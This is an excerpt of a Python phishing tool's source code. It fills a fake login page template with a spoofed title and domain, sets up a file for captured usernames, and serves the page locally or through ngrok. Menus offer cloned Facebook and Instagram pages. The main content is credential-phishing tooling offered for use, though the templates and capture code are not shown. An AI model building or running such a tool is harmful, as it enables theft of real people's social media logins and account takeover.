...
def open_server(path,title,webName):
    # XX-PHISHING-LINK-XX --> main_path
    # XX-DOMAIN-NAME-XX --> main_domain
    # XX-TITLE-XX --> title  is main window title

    main_path = "site/"+path+"/index.php"
    userCredential_path = "site/"+path+"usernames.txt"
    with open(r'www/main','r') as file :
        data = file.read()
        data = data.replace("XX-TITLE-XX",title).replace("XX-DOMAIN-NAME-XX",webName).replace("XX-PHISHING-LINK-XX",main_path)
    with open(r'www/index.html','w') as file :
        file.write(data)
    print("""Phishing Method :
    01 -> localhost
    02 -> ngrok
    """)
    method_s = input("Enter Value : ")
    if method_s == '01' or method_s == '1' :
        os.system("bash php.sh")
    elif method_s == '02' or method_s == '2' :
        os.system("bash ngrok.sh")
    else : print("Enterl valid value")
def pages(m_input):
    ...
    if   m_input == '01' or m_input == '1':
        ...
        """)
        fb_input = input("Select Facebook Page : ")
        ...
        """)
        insta_input = input("Select Instagram Page : ")
        ...
        print("Github : https://github.com/AkhilKoradiya")
...
def signal_handler(sig, frame):
    print('\n')
    print('You exit from tool')
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

while True:
        m_input = input("Enter Value : ")
